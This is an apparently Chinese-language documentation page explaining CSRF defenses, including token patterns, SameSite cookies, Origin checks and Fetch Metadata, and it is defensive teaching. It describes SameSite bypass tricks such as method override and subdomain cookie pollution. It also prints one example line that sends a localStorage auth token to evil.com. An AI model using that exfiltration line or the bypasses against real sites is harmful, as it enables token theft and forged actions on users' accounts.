---
title: "CSRF防护" 
weight: 2
bookToc: true
---

## 概念

CSRF 本质是利用浏览器自动携带 Cookie 的机制，在用户已登录目标网站的前提下，通过钓鱼网站、隐藏链接等手段，在用户不感知的情况下，以用户身份向目标网站发起状态改变的请求。

服务端无法区分该请求是用户主动发起的，还是被伪造的。

![alt text](/data/image/security/csrf/image.png)

参看WebGoat练习增加理解，[参考]({{< relref "/docs/security/exploits/webgoat/A5/csrf.md" >}}) 

CSRF对应的防护手段是有很多的，理解这些防护手段有助于我们理解相关HTTP层面的知识。

## 防护手段

### CSRF Token

服务端为每个会话或请求生成一个不可预测的随机 Token，嵌入表单或请求头中，提交时验证其有效性。

#### Synchronizer Token Pattern

Token 存储于 Session，每次请求校验

第一步：用户请求页面，服务端生成 Token
```python
token = random_string(32)        # 生成随机字符串
session["csrf_token"] = token    # 存入用户的 Session
```

第二步：Token 嵌入 HTML 表单返回给用户
```html
<form action="/transfer" method="POST">
  <input type="text" name="amount">
  <input type="hidden" name="csrf_token" value="a8f3b2c9d1e4">
  <button type="submit">转账</button>
</form>
```

第三步：用户提交，服务端校验
```python
# 服务端收到请求
request_token = request.form["csrf_token"]   # 请求中的 Token
session_token  = session["csrf_token"]        # Session 中的 Token

if request_token != session_token:
    return 403  # 拒绝
```

攻击者的钓鱼页面构造请求时，Token 在服务端 Session 里，嵌在 bank.com 的页面 HTML 里（同源策略）都导致攻击者是拿不到这个Token的。

同步器 Token 模式依赖一个前提：**服务端渲染页面时，把 Token 直接嵌入 HTML。** 所以对于前后端分离（后端只提供JSON API）项目是不适用的。

但前后端分离本身已经天然弱化了 CSRF 风险——因为接口通常用 `Authorization: Bearer <JWT>` 等认证信息放请求头而非 Cookie 认证，攻击者伪造请求时根本拿不到 JWT等认证信息，CSRF 就失去了成立的前提。

#### Double Submit Cookie

Token 同时放在 Cookie 和请求参数中，服务端比对两者是否一致，适合REST API，不依赖服务端存储，让客户端自己证明自己。

第一步：服务端设置 Token Cookie，注意这个 Cookie 不设置 `HttpOnly`，因为 JS 需要能读到它。
```
httpSet-Cookie: csrf_token=a8f3b2c9d1e4; Secure; SameSite=Strict
```

第二步：前端 JS 读取 Cookie，放入请求头`X-CSRF-Token`
```js
// 读取 Cookie 中的 Token
const token = getCookie("csrf_token")

// 放入请求头或表单参数
fetch("/transfer", {
  method: "POST",
  headers: {
    "X-CSRF-Token": token   // ← 手动带上
  },
  credentials: "include"
})
```

第三步：服务端对比两个值
```python
cookie_token  = request.cookies["csrf_token"]   # Cookie 里的
header_token  = request.headers["X-CSRF-Token"] # 请求参数里的

if cookie_token != header_token:
    return 403
```

攻击者的钓鱼页面虽然能通过浏览器自动携带记住，触发携带 Cookie 的请求，但攻击者的 JS 在 `evil.com` 下
读取的是 `evil.com` 的 Cookie，读不到 `bank.com` 的（同时如果用表单伪造，表单也无法设置请求头；用 JS `fetch` 伪造，`credentials: "include"  // Cookie 浏览器自动携带`，但同源策略限制，读不到 csrf_token，无法设置请求头）

针对这种方案，如果攻击者能控制子域名写入 Cookie，就能伪造一对匹配的值

#### 加密 Token

让 Token 本身可验证，即使攻击者能写入任意 Cookie，也无法构造出合法的 Token，基于用户 ID + 时间戳 + 密钥生成，无需服务端存储

第一步：服务端生成签名 Token
```
Token = HMAC(用户ID + 时间戳, 服务端密钥)
```

第二步：Token 下发给客户端
```
Set-Cookie: csrf_token=user123:1709123456:a8f3b2c9d1e4f7; Secure; SameSite=Strict
```

第三步：前端 JS 读取 Cookie，放入请求头`X-CSRF-Token`

第四步：服务端收到请求后验证和签名、时间是否有效

加密Token 配合 `Double Submit Cookie`，解决假如 Cookie 能够被任意写入的问题

### SameSite 

通过浏览器层面限制跨站请求是否携带 Cookie

```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

下面整理几种攻击方式：

---

**第一种：HTTP 方法覆盖**

默认 `SameSite` 值为 `SameSite=Lax`，允许跨站 GET 请求携带 Cookie，但不允许 POST。

部分框架支持用 GET 参数覆盖 HTTP 方法：
`https://bank.com/transfer?_method=POST&amount=10000`
服务端实际按 POST 处理，但浏览器发的是 GET，Cookie 照常携带，绕过了 Lax 限制。

---

**第二种：OAuth 重定向窗口**

`SameSite=Lax` 有一个[两分钟宽限期](https://stackoverflow.com/questions/59032055/how-to-avoid-samesite-2minute-window-for-laxpost-temporary-intervention)：新设置的 Cookie 在两分钟内不受 Lax 限制，允许跨站携带。
攻击者利用这个窗口发起攻击，比如 触发受害者重新走一遍 OAuth 登录流程

---

**第三种：子域名污染**

同站（Same-Site）的判断标准：
看的是 eTLD+1（有效顶级域名 + 一级）是否相同，不管端口和子域名

下面都是`SameSite`
```
bank.com        ↘
sub.bank.com    →  同属 bank.com 这个 Site
evil.bank.com   ↗
```

如果攻击者控制了 `evil.bank.com`，是可以污染 Cookie 的，或者攻击者 `从 evil.bank.com` 发起请求，浏览器认为是 `same-site` 请求，`SameSite=Strict/Lax` 并不拦截

### Origin / Referer

服务端检查请求头中的来源信息，拒绝非预期来源的请求：
- Origin 头：现代浏览器在跨站 POST 请求中会附带，优先校验
- Referer 头：标识请求来源页面，可作为辅助校验

Referer 携带完整 URL，涉及隐私，浏览器隐私模式会抹掉它。实践中优先校验 Origin，Origin 为空再降级校验 Referer，两者都没有再根据业务决定放行还是拒绝，或采用其他组合方案

### Fetch Metadata

利用浏览器自动附加的 `Sec-Fetch-*` 头，在服务端做请求策略判断，所有主流浏览器均支持：

- `Sec-Fetch-Site`: 请求与目标的源关系（same-origin / same-site / cross-site）
- `Sec-Fetch-Mode`: 请求模式（navigate / cors / no-cors 等）
- `Sec-Fetch-Dest`: 请求目标类型（document / fetch / image 等）

### 自定义请求头

针对 API 接口，要求请求必须携带自定义头（如 `X-Requested-With`）。由于跨站简单表单无法设置自定义头，服务端可以此区分合法请求

---

如果服务端配置了宽松的 CORS，允许跨域请求携带自定义头：
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
```

攻击者就可以用 `fetch()` 从恶意站点发送带有自定义头的请求，导致防护失效

### localStorage

JS 读取 `localStorage`，放入请求头`X-CSRF-Token`，不涉及 Cookie，自然不涉及 CSRF （CSRF 能成功的根本原因是：浏览器发请求时会自动携带 Cookie，攻击者不需要知道 Cookie 的值，浏览器帮他带过去了），**但要注意，这样做把 CSRF 问题换成了 XSS 问题**

Cookie 设置 HttpOnly 后，XSS 脚本无法读取。但 localStorage 里的 token，XSS 一行代码就能拿走：
```js
fetch("https://evil.com/steal?token=" + localStorage.getItem("auth_token"))
```

### 用户交互二次验证

对高风险操作（转账、改密、删除账户）要求用户二次确认，解决用户无感知的问题，同时攻击者也拿不到二次确认的信息


## 总结

对于防 CSRF 攻击，建议把设置 Cookie 的 SameSite，Double Submit Cookie 和加密 Token的优先级提高；对于不使用 Cookie 的网站，要注意防 XSS 攻击读取 localStorage